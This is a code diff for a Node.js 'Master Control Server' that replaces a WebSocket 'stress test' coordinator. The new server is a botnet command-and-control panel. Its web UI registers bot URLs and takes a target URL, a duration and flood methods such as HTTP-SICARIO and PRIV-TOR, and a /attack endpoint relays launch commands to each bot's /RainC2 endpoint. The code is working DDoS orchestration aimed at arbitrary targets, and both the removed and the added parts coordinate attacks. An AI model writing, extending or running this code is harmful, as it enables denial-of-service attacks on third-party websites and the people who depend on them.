-  const clientId = ++clientIdCounter;
-  const clientInfo = {
-    id: clientId,
-    ws: ws,
-    type: null,
-    status: 'idle',
-    stats: { sent: 0, success: 0, failed: 0 }
-  };
-  
-  clients.set(clientId, clientInfo);
-  console.log(`[+] Client #${clientId} connected`);
-
-  ws.on('message', (message) => {
-    try {
-      const data = JSON.parse(message);
-      
-      if (data.type === 'identify') {
-        clientInfo.type = data.role;
-        console.log(`[i] Client #${clientId} -> ${data.role}`);
-        
-        if (data.role === 'admin') {
-          sendStatus(ws);
-        } else if (data.role === 'worker') {
-          ws.send(JSON.stringify({ type: 'ready' }));
-          // Notify all admins that a new worker connected
-          broadcastToAdmins({
-            type: 'worker_connected',
-            workerId: clientId
-          });
-          // Also send updated status to all admins
-          setTimeout(() => {
-            clients.forEach((client) => {
-              if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
-                sendStatus(client.ws);
-              }
-            });
-          }, 100);
-        }
-      }
-      
-      if (data.type === 'start_test' && clientInfo.type === 'admin') {
-        startStressTest(data.config);
-      }
-      
-      if (data.type === 'stop_test' && clientInfo.type === 'admin') {
-        stopStressTest();
-      }
-      
-      if (data.type === 'get_status' && clientInfo.type === 'admin') {
-        sendStatus(ws);
-      }
-      
-      if (data.type === 'stats' && clientInfo.type === 'worker') {
-        clientInfo.stats = data.stats;
-        clientInfo.currentUA = data.currentUA || 'Unknown';
-        clientInfo.currentProxy = data.currentProxy || 'Direct';
-        clientInfo.uaCount = data.uaCount || 0;
-        clientInfo.proxyCount = data.proxyCount || 0;
-        broadcastToAdmins({
-          type: 'worker_stats',
-          workerId: clientId,
-          stats: data.stats,
-          currentUA: data.currentUA,
-          currentProxy: data.currentProxy,
-          uaCount: data.uaCount,
-          proxyCount: data.proxyCount
-        });
-      }
-      
-    } catch (err) {
-      console.error('[!] Message error:', err);
-    }
-  });
-
-  ws.on('close', () => {
-    console.log(`[-] Client #${clientId} disconnected (type: ${clientInfo.type || 'unknown'})`);
-    
-    // Keep the final stats before removing
-    const finalStats = {
-      id: clientId,
-      type: clientInfo.type,
-      stats: clientInfo.stats
-    };
-    
-    clients.delete(clientId);
-    
-    broadcastToAdmins({ 
-      type: 'client_disconnected', 
-      clientId,
-      finalStats 
-    });
-    
-    // Update all admin panels
-    setTimeout(() => {
-      clients.forEach((client) => {
-        if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
-          sendStatus(client.ws);
-        }
-      });
-    }, 100);
-  });
-
-  ws.on('error', (error) => {
-    console.error(`[!] WebSocket error on client #${clientId}:`, error.message);
-  });
-});
-
-function startStressTest(config) {
-  activeTest = config;
-  console.log(`[!] Starting stress test on ${config.target}`);
-  
-  const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
-  
-  if (workers.length === 0) {
-    broadcastToAdmins({
-      type: 'error',
-      message: 'No workers connected'
-    });
-    return;
-  }
-  
-  console.log(`[*] Attack started with ${workers.length} workers for ${config.duration}s`);
-  console.log(`[*] Attack Mode: ${config.attackMode || 'standard'}`);
-  console.log(`[*] Target: ${config.target}`);
-  
-  workers.forEach(worker => {
-    worker.status = 'active';
-    worker.stats = { sent: 0, success: 0, failed: 0 };
-    worker.ws.send(JSON.stringify({
-      type: 'start',
-      config: config
-    }));
-  });
-  
-  broadcastToAdmins({
-    type: 'test_started',
-    workers: workers.length,
-    config: config
-  });
-  
-  // Report stats every 10 seconds
-  const statsReporter = setInterval(() => {
-    if (!activeTest) {
-      clearInterval(statsReporter);
-      return;
-    }
-    
-    const activeWorkers = Array.from(clients.values()).filter(c => c.type === 'worker');
-    let totalSent = 0, totalSuccess = 0, totalFailed = 0;
-    
-    activeWorkers.forEach(w => {
-      totalSent += w.stats.sent || 0;
-      totalSuccess += w.stats.success || 0;
-      totalFailed += w.stats.failed || 0;
-    });
-    
-    const rate = totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : 0;
-    console.log(`[📊] Sent: ${totalSent} | Success: ${totalSuccess} | Failed: ${totalFailed} | Rate: ${rate}% | Workers: ${activeWorkers.length}`);
-  }, 10000);
-  
-  // Auto-stop after duration and show report
-  setTimeout(() => {
-    if (activeTest) {
-      console.log('[!] Attack duration completed');
-      clearInterval(statsReporter);
-      stopStressTest();
-    }
-  }, config.duration * 1000 + 2000); // Add 2 seconds buffer for final stats
-}
-
-function stopStressTest() {
-  console.log('[!] Stopping stress test');
-  activeTest = null;
-  
-  const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
-  
-  // Collect final stats from all workers
-  const finalStats = workers.map(w => ({
-    id: w.id,
-    stats: { ...w.stats }
-  }));
-  
-  // Calculate totals
-  let totalSent = 0, totalSuccess = 0, totalFailed = 0;
-  finalStats.forEach(w => {
-    totalSent += w.stats.sent || 0;
-    totalSuccess += w.stats.success || 0;
-    totalFailed += w.stats.failed || 0;
-  });
-  
-  // Log summary
-  console.log('╔════════════════════════════════════════╗');
-  console.log('║       ATTACK SUMMARY REPORT            ║');
-  console.log('╠════════════════════════════════════════╣');
-  console.log(`║  Total Requests Sent: ${totalSent.toString().padStart(16)} ║`);
-  console.log(`║  Successful:          ${totalSuccess.toString().padStart(16)} ║`);
-  console.log(`║  Failed:              ${totalFailed.toString().padStart(16)} ║`);
-  console.log(`║  Success Rate:        ${totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
-  console.log(`║  Workers Used:        ${workers.length.toString().padStart(16)} ║`);
-  console.log('╚════════════════════════════════════════╝');
-  
-  workers.forEach(worker => {
-    worker.status = 'idle';
-    worker.ws.send(JSON.stringify({ type: 'stop' }));
-  });
-  
-  broadcastToAdmins({ 
-    type: 'test_stopped',
-    finalStats,
-    summary: {
-      totalSent,
-      totalSuccess,
-      totalFailed,
-      successRate: totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : 0,
-      workersUsed: workers.length
-    }
-  });
-}
-
-function sendStatus(ws) {
-  const workers = Array.from(clients.values())
-    .filter(c => c.type === 'worker' && c.ws.readyState === WebSocket.OPEN)
-    .map(c => ({
-      id: c.id,
-      status: c.status,
-      stats: c.stats
-    }));
-  
-  const message = {
-    type: 'status',
-    workers: workers,
-    activeTest: activeTest
-  };
-  
+async function fetchData() {
   try {
-    ws.send(JSON.stringify(message));
-    console.log(`[→] Sent status to admin: ${workers.length} workers`);
-  } catch (e) {
-    console.error('[!] Failed to send status:', e.message);
+    const response = await fetch('https://httpbin.org/get');
+    const data = await response.json();
+    console.log('\n========================================');
+    console.log('🎮 Master Control Server Started!');
+    console.log('========================================');
+    console.log(`📍 Local:    http://localhost:${port}`);
+    console.log(`🌐 Network:  http://${data.origin}:${port}`);
+    console.log('========================================\n');
+    return data;
+  } catch (error) {
+    console.log(`Server running at http://localhost:${port}`);
   }
 }
 
-function broadcastToAdmins(data) {
-  clients.forEach(client => {
-    if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
-      client.ws.send(JSON.stringify(data));
-    }
-  });
-}
+// Serve Master Control UI
+app.get('/', (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Master Control Server</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.8); }
+        }
+        .pulse-glow { animation: pulse-glow 2s infinite; }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white min-h-screen">
+    <!-- Header -->
+    <div class="bg-black border-b border-red-900 shadow-lg">
+        <div class="max-w-7xl mx-auto px-6 py-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <div class="w-12 h-12 bg-gradient-to-br from-red-600 to-red-800 rounded-lg flex items-center justify-center pulse-glow">
+                        <span class="text-2xl">👑</span>
+                    </div>
+                    <div>
+                        <h1 class="text-2xl font-bold bg-gradient-to-r from-red-500 to-purple-600 bg-clip-text text-transparent">
+                            Master Control Server
+                        </h1>
+                        <p class="text-xs text-gray-400">Command & Control Multiple Bots</p>
+                    </div>
+                </div>
+                <div class="text-right">
+                    <div class="text-xs text-gray-500">Bots Connected</div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                        <span class="text-2xl text-green-400 font-bold" id="botCount">0</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`
-╔════════════════════════════════════════╗
-║   STRESS TEST SERVER RUNNING           ║
-╠════════════════════════════════════════╣
-║  Port: ${PORT}                            ║
-║  Environment: ${process.env.NODE_ENV || 'development'}              ║
-║  Admin: http://localhost:${PORT}/admin    ║
-║  Worker: http://localhost:${PORT}/worker  ║
-╚════════════════════════════════════════╝
+    <div class="max-w-7xl mx-auto px-6 py-8">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Bot Management -->
+            <div class="lg:col-span-2 space-y-6">
+                <!-- Add Bot -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
+                    <div class="bg-gradient-to-r from-blue-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
+                        <h2 class="text-xl font-bold flex items-center gap-2">
+                            <span>🤖</span> Add Bot Client
+                        </h2>
+                    </div>
+                    <div class="p-6">
+                        <div class="flex gap-2">
+                            <input type="text" id="botUrl" 
+                                class="flex-1 bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50" 
+                                placeholder="http://192.168.1.100:5552">
+                            <button onclick="addBot()" 
+                                class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition-all">
+                                Add Bot
+                            </button>
+                        </div>
+                        <p class="text-xs text-gray-500 mt-2">Enter the bot's URL (example: http://192.168.1.100:5552)</p>
+                    </div>
+                </div>
+
+                <!-- Connected Bots List -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
+                    <div class="bg-gradient-to-r from-green-900/50 to-blue-900/50 px-6 py-4 border-b border-gray-700">
+                        <h2 class="text-xl font-bold flex items-center gap-2">
+                            <span>📡</span> Connected Bots
+                        </h2>
+                    </div>
+                    <div class="p-6">
+                        <div id="botsList" class="space-y-2">
+                            <p class="text-gray-500 text-center py-8">No bots connected yet...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Attack Control -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
+                    <div class="bg-gradient-to-r from-red-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
+                        <h2 class="text-xl font-bold flex items-center gap-2">
+                            <span>⚔️</span> Attack All Bots
+                        </h2>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">🎯 Target URL</label>
+                            <input type="text" id="target" 
+                                class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
+                                placeholder="https://example.com">
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">⏱️ Duration (seconds)</label>
+                                <input type="number" id="time" value="60" 
+                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
+                                    min="1">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">💣 Attack Method</label>
+                                <select id="method" 
+                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
+                                    <option>HTTP-SICARIO</option>
+                                    <option>RAW-HTTP</option>
+                                    <option>R9</option>
+                                    <option>PRIV-TOR</option>
+                                    <option>HOLD-PANEL</option>
+                                    <option>R1</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <button onclick="attackAll()" id="attackBtn" 
+                            class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
+                            🚀 Launch Attack on All Bots
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Activity Logs -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
+                    <div class="bg-gradient-to-r from-purple-900/50 to-pink-900/50 px-6 py-4 border-b border-gray-700 flex items-center justify-between">
+                        <h2 class="text-xl font-bold flex items-center gap-2">
+                            <span>📊</span> Activity Logs
+                        </h2>
+                        <button onclick="clearLogs()" 
+                            class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded transition-colors">
+                            Clear
+                        </button>
+                    </div>
+                    <div class="p-6">
+                        <div id="logs" class="bg-gray-900 rounded-lg border border-gray-700 p-4 h-64 overflow-y-auto font-mono text-sm">
+                            <p class="text-gray-500 text-center py-8">No activity yet...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sidebar -->
+            <div class="space-y-6">
+                <!-- Stats -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
+                    <h3 class="text-lg font-bold mb-4">📈 Statistics</h3>
+                    <div class="space-y-3">
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400 text-sm">Total Bots</span>
+                            <span class="text-blue-400 font-bold" id="totalBots">0</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400 text-sm">Active Attacks</span>
+                            <span class="text-red-400 font-bold" id="activeAttacks">0</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400 text-sm">Total Attacks</span>
+                            <span class="text-green-400 font-bold" id="totalAttacks">0</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Actions -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
+                    <h3 class="text-lg font-bold mb-4">⚡ Quick Actions</h3>
+                    <div class="space-y-2">
+                        <button onclick="refreshBots()" 
+                            class="w-full bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded transition-colors text-sm">
+                            🔄 Refresh Bots
+                        </button>
+                        <button onclick="removeAllBots()" 
+                            class="w-full bg-red-900/50 hover:bg-red-800/50 text-white py-2 px-4 rounded transition-colors text-sm">
+                            🗑️ Remove All Bots
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Available Methods -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
+                    <h3 class="text-lg font-bold mb-4">📋 Attack Methods</h3>
+                    <div class="space-y-2 text-xs">
+                        <div class="bg-gray-900 p-2 rounded border border-red-900/30">
+                            <div class="text-red-400 font-bold">HTTP-SICARIO</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-orange-900/30">
+                            <div class="text-orange-400 font-bold">RAW-HTTP</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-yellow-900/30">
+                            <div class="text-yellow-400 font-bold">R9</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-green-900/30">
+                            <div class="text-green-400 font-bold">PRIV-TOR</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-blue-900/30">
+                            <div class="text-blue-400 font-bold">HOLD-PANEL</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-purple-900/30">
+                            <div class="text-purple-400 font-bold">R1</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let bots = [];
+        let totalAttacks = 0;
+        let activeAttacks = 0;
+
+        function updateStats() {
+            document.getElementById('botCount').textContent = bots.length;
+            document.getElementById('totalBots').textContent = bots.length;
+            document.getElementById('totalAttacks').textContent = totalAttacks;
+            document.getElementById('activeAttacks').textContent = activeAttacks;
+        }
+
+        function renderBots() {
+            const botsList = document.getElementById('botsList');
+            if (bots.length === 0) {
+                botsList.innerHTML = '<p class="text-gray-500 text-center py-8">No bots connected yet...</p>';
+                return;
+            }
+
+            botsList.innerHTML = bots.map((bot, index) => \`
+                <div class="bg-gray-900 p-4 rounded-lg border border-gray-700 flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                        <div>
+                            <div class="text-white font-mono text-sm">\${bot}</div>
+                            <div class="text-xs text-gray-500">Bot #\${index + 1}</div>
+                        </div>
+                    </div>
+                    <button onclick="removeBot(\${index})" 
+                        class="text-red-400 hover:text-red-300 text-sm">
+                        Remove
+                    </button>
+                </div>
+            \`).join('');
+        }
+
+        function addBot() {
+            const url = document.getElementById('botUrl').value.trim();
+            if (!url) {
+                addLog('Error: Please enter a bot URL', 'error');
+                return;
+            }
+
+            if (bots.includes(url)) {
+                addLog('Error: Bot already added', 'error');
+                return;
+            }
+
+            bots.push(url);
+            document.getElementById('botUrl').value = '';
+            renderBots();
+            updateStats();
+            addLog(\`Bot added: \${url}\`, 'success');
+        }
+
+        function removeBot(index) {
+            const bot = bots[index];
+            bots.splice(index, 1);
+            renderBots();
+            updateStats();
+            addLog(\`Bot removed: \${bot}\`, 'info');
+        }
+
+        function removeAllBots() {
+            if (confirm('Remove all bots?')) {
+                bots = [];
+                renderBots();
+                updateStats();
+                addLog('All bots removed', 'info');
+            }
+        }
+
+        function refreshBots() {
+            renderBots();
+            updateStats();
+            addLog('Bots list refreshed', 'info');
+        }
+
+        async function attackAll() {
+            const target = document.getElementById('target').value;
+            const time = document.getElementById('time').value;
+            const method = document.getElementById('method').value;
+
+            if (!target || !time) {
+                addLog('Error: Target and time required', 'error');
+                return;
+            }
+
+            if (bots.length === 0) {
+                addLog('Error: No bots connected', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('attackBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Launching...';
+
+            activeAttacks++;
+            totalAttacks++;
+            updateStats();
+
+            addLog(\`Launching \${method} attack to \${bots.length} bots\`, 'info');
+            addLog(\`Target: \${target} | Duration: \${time}s\`, 'info');
+
+            let successCount = 0;
+            let failCount = 0;
+
+            for (const bot of bots) {
+                try {
+                    const response = await fetch(\`/attack?bot=\${encodeURIComponent(bot)}&target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        successCount++;
+                        addLog(\`✅ \${bot} - Attack launched\`, 'success');
+                    } else {
+                        failCount++;
+                        addLog(\`❌ \${bot} - Failed: \${data.error}\`, 'error');
+                    }
+                } catch (error) {
+                    failCount++;
+                    addLog(\`❌ \${bot} - Network error\`, 'error');
+                }
+            }
+
+            addLog(\`Attack complete: \${successCount} success, \${failCount} failed\`, 'info');
+
+            setTimeout(() => {
+                activeAttacks = Math.max(0, activeAttacks - 1);
+                updateStats();
+            }, parseInt(time) * 1000);
+
+            btn.disabled = false;
+            btn.textContent = '🚀 Launch Attack on All Bots';
+        }
+
+        function addLog(message, type = 'info') {
+            const logsDiv = document.getElementById('logs');
+            const timestamp = new Date().toLocaleTimeString();
+            const icons = { info: '🔵', success: '✅', error: '❌' };
+            const colors = { info: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
+            
+            if (logsDiv.querySelector('.text-gray-500')) {
+                logsDiv.innerHTML = '';
+            }
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'mb-2 pb-2 border-b border-gray-800';
+            logEntry.innerHTML = \`
+                <div class="flex items-start gap-2">
+                    <span>\${icons[type]}</span>
+                    <div class="flex-1">
+                        <span class="text-gray-500 text-xs">[\${timestamp}]</span>
+                        <span class="\${colors[type]} ml-2">\${message}</span>
+                    </div>
+                </div>
+            \`;
+            logsDiv.appendChild(logEntry);
+            logsDiv.scrollTop = logsDiv.scrollHeight;
+        }
+
+        function clearLogs() {
+            document.getElementById('logs').innerHTML = '<p class="text-gray-500 text-center py-8">No activity yet...</p>';
+        }
+
+        // Load bots from localStorage
+        window.addEventListener('load', () => {
+            const saved = localStorage.getItem('bots');
+            if (saved) {
+                bots = JSON.parse(saved);
+                renderBots();
+                updateStats();
+            }
+        });
+
+        // Save bots to localStorage
+        window.addEventListener('beforeunload', () => {
+            localStorage.setItem('bots', JSON.stringify(bots));
+        });
+    </script>
+</body>
+</html>
   `);
+});
+
+// Attack endpoint - sends commands to bots
+app.get('/attack', async (req, res) => {
+  const { bot, target, time, methods } = req.query;
+
+  if (!bot || !target || !time || !methods) {
+    return res.json({ success: false, error: 'Missing parameters' });
+  }
+
+  try {
+    console.log(`[ATTACK] Sending to ${bot}: ${methods} -> ${target} for ${time}s`);
+    
+    const response = await axios.get(`${bot}/RainC2`, {
+      params: { target, time, methods },
+      timeout: 5000
+    });
+
+    res.json({ success: true, data: response.data });
+  } catch (error) {
+    console.error(`[ERROR] Failed to contact ${bot}: ${error.message}`);
+    res.json({ success: false, error: error.message });
+  }
+});
+
+// Get connected bots
+app.get('/bots', (req, res) => {
+  res.json({ bots: connectedBots });
+});
+
+app.listen(port, () => {
+  fetchData();
 });
